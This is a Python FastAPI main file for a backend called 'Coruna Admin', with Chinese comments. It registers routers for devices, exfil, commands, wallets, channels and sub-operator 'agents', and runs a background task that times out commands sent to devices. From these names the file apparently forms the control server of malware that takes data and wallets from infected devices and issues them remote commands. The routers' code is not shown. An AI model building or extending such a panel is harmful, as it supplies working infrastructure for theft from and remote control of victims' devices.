from contextlib import asynccontextmanager
from pathlib import Path
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
import os

from . import config
from .database import init_db
from .auth import get_or_create_admin
from .limiter import limiter, LIMITER_AVAILABLE

from .routers import (
    auth as auth_router,
    two_factor as two_factor_router,
    report as report_router,
    devices as devices_router,
    exfil as exfil_router,
    commands as commands_router,
    channels as channels_router,
    templates as templates_router,
    wallets as wallets_router,
    dashboard as dashboard_router,
    logs as logs_router,
    audit as audit_router,
    notifications as notifications_router,
    settings as settings_router,
    users as users_router,
    agents as agents_router,
)
from .routers.agent import (
    auth as agent_auth_router,
    devices as agent_devices_router,
    exfil as agent_exfil_router,
    channels as agent_channels_router,
    templates as agent_templates_router,
    dashboard as agent_dashboard_router,
    profile as agent_profile_router,
    two_factor as agent_two_factor_router,
)


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https: blob:; "
            "connect-src 'self' ws: wss: http://127.0.0.1:7000 http://localhost:7000 http://127.0.0.1:7070 http://localhost:7070; "
            "font-src 'self' data:; "
            "frame-src 'self' blob: about:; "
            "frame-ancestors 'self';"
        )
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        return response


FRONTEND_DIST = Path(__file__).resolve().parent.parent / "frontend" / "dist"


@asynccontextmanager
async def lifespan(app: FastAPI):
    import asyncio as _asyncio
    from .database import SessionLocal
    from .routers.notifications import _register_db_factory, register_main_loop
    try:
        register_main_loop(_asyncio.get_running_loop())
    except Exception:
        pass
    _register_db_factory(SessionLocal)
    db = SessionLocal()
    try:
        init_db()
        get_or_create_admin(db)
        from .settings_manager import ensure_default_settings
        ensure_default_settings(db)
    finally:
        db.close()

    # --------- 后台守护协程：全部阈值从 config_constants 读取，支持 .env + settings 表 + 默认兜底 ---------
    _bg_tasks = []

    async def _rotate_logs_cron():
        """每日 [rotate_start_hhmm, start + rotate_window_minutes] 区间自动跑一次 rotate_all。"""
        from datetime import datetime as _dt
        from .config_constants import cfg_int, cfg_str, parse_hhmm, DB_FILE as _unused1
        _ = _unused1
        while True:
            try:
                from .routers._rotate_logs import run_daily_if_needed
                db_tmp = SessionLocal()
                try:
                    tick_sec = cfg_int(db_tmp, "cron.rotate_tick_seconds")
                    start_hhmm = cfg_str(db_tmp, "cron.rotate_start_hhmm")
                    win_min = cfg_int(db_tmp, "cron.rotate_window_minutes")
                finally:
                    db_tmp.close()
                try:
                    sh, sm = parse_hhmm(start_hhmm)
                except ValueError:
                    sh, sm = 3, 30
                    win_min = max(1, min(120, int(win_min)))
                now = _dt.now()
                start_min_of_day = sh * 60 + sm
                end_min_of_day = start_min_of_day + max(1, min(120, int(win_min)))
                now_min = now.hour * 60 + now.minute
                force = False
                if start_min_of_day <= now_min < end_min_of_day:
                    force = True
                await run_daily_if_needed(force=force)
            except Exception:
                import logging as _lg
                _lg.getLogger("bg.rotate").exception("rotate_logs_cron failed")
            try:
                db_tick = SessionLocal()
                try:
                    tick = cfg_int(db_tick, "cron.rotate_tick_seconds")
                finally:
                    db_tick.close()
            except Exception:
                tick = 60
            await _asyncio.sleep(max(10, int(tick)))

    async def _command_timeout_guard():
        """每 cmd_timeout_tick_seconds 扫一次：commands.executing 超过 cmd_timeout_minutes → timeout + notification。"""
        from datetime import datetime, timedelta as _td
        while True:
            try:
                from sqlalchemy import select, and_, update
                from .database import Command, Notification, Device
                from .config_constants import cfg_int
                db2 = SessionLocal()
                try:
                    now = datetime.now()
                    timeout_min = max(1, cfg_int(db2, "cron.cmd_timeout_minutes"))
                    cutoff = now - _td(minutes=timeout_min)
                    stmt = (
                        select(Command.id, Command.device_uuid, Command.command, Command.created_at)
                        .where(and_(Command.status == "executing", Command.created_at < cutoff))
                    )
                    rows = db2.execute(stmt).fetchall()
                    if rows:
                        ids = [int(r[0]) for r in rows]
                        db2.execute(
                            update(Command)
                            .where(Command.id.in_(ids))
                            .values(status="timeout", executed_at=now)
                        )
                        for r in rows:
                            cid, duuid, cmd, cat = r
                            dev_model = ""
                            try:
                                dev = db2.execute(
                                    select(Device.device_model).where(Device.device_uuid == duuid).limit(1)
                                ).fetchone()
                                if dev and dev[0]:
                                    dev_model = str(dev[0])
                            except Exception:
                                pass
                            notif = Notification(
                                timestamp=now,
                                title=f"命令超时 # {cid}",
                                category="warning",
                                is_read=0,
                                related_device_uuid=duuid,
                                related_resource_type="command",
                                related_resource_id=str(cid),
                                message=(
                                    f"设备 {duuid}" + (f" ({dev_model})" if dev_model else "")
                                    + f" 命令执行超过 {timeout_min} 分钟未响应，已自动标记为 timeout。\n"
                                    + f"创建时间: {cat.isoformat(sep=' ', timespec='minutes') if cat else '-'}\n"
                                    + f"命令预览: {(str(cmd)[:200] + '...') if len(str(cmd)) > 200 else str(cmd)}"
                                )
                            )
                            db2.add(notif)
                        db2.commit()
                finally:
                    db2.close()
            except Exception:
                import logging as _lg
                _lg.getLogger("bg.timeout").exception("command_timeout_guard failed")
            try:
                db_tick = SessionLocal()
                try:
                    from .config_constants import cfg_int as _ci
                    sleep_sec = max(30, _ci(db_tick, "cron.cmd_timeout_tick_seconds"))
                finally:
                    db_tick.close()
            except Exception:
                sleep_sec = 300
            await _asyncio.sleep(sleep_sec)

    try:
        _bg_tasks.append(_asyncio.create_task(_rotate_logs_cron(), name="rotate_logs_cron"))
    except Exception:
        pass
    try:
        _bg_tasks.append(_asyncio.create_task(_command_timeout_guard(), name="command_timeout_guard"))
    except Exception:
        pass

    try:
        yield
    finally:
        for t in _bg_tasks:
            try:
                t.cancel()
            except Exception:
                pass


app = FastAPI(
    title="Coruna Admin API",
    description="Coruna Management Backend",
    version="1.0.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc",
)

if LIMITER_AVAILABLE and limiter is not None:
    app.state.limiter = limiter
    try:
        from slowapi.errors import RateLimitExceeded
        from slowapi.util import get_remote_address
        app.state._rate_limit_remote = get_remote_address

        @app.exception_handler(RateLimitExceeded)
        async def rate_limit_handler(request: Request, exc: RateLimitExceeded):  # noqa: ARG001
            return JSONResponse(
                status_code=429,
                content={"detail": "请求过于频繁，请稍后重试", "error": "rate_limit_exceeded"}
            )
    except Exception:
        pass

app.add_middleware(
    CORSMiddleware,
    allow_origins=config.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.add_middleware(SecurityHeadersMiddleware)


@app.get("/api/health", tags=["system"])
async def health_check():
    return {"status": "ok", "version": "1.0.0"}


app.include_router(auth_router.router)
app.include_router(two_factor_router.router)
app.include_router(report_router.router)
app.include_router(devices_router.router)
app.include_router(exfil_router.router)
app.include_router(commands_router.router)
app.include_router(channels_router.router)
app.include_router(templates_router.router)
app.include_router(wallets_router.router)
app.include_router(dashboard_router.router)
app.include_router(logs_router.router)
app.include_router(audit_router.router)
app.include_router(notifications_router.router)
app.include_router(settings_router.router)
app.include_router(users_router.router)
app.include_router(agents_router.router)

app.include_router(agent_auth_router.router)
app.include_router(agent_two_factor_router.router)
app.include_router(agent_devices_router.router)
app.include_router(agent_exfil_router.router)
app.include_router(agent_channels_router.router)
app.include_router(agent_templates_router.router)
app.include_router(agent_dashboard_router.router)
app.include_router(agent_profile_router.router)


if FRONTEND_DIST.exists() and FRONTEND_DIST.is_dir():
    app.mount("/assets", StaticFiles(directory=str(FRONTEND_DIST / "assets")), name="assets")

    @app.get("/{full_path:path}", response_class=HTMLResponse, include_in_schema=False)
    async def serve_frontend(full_path: str):
        if full_path.startswith("api/") or full_path == "docs" or full_path == "redoc" or full_path == "openapi.json":
            from fastapi import HTTPException
            raise HTTPException(status_code=404, detail="Not Found")
        index_html = FRONTEND_DIST / "index.html"
        if index_html.exists():
            return FileResponse(str(index_html), media_type="text/html")
        return HTMLResponse("<h1>Coruna Admin</h1><p>Frontend not built.</p>")
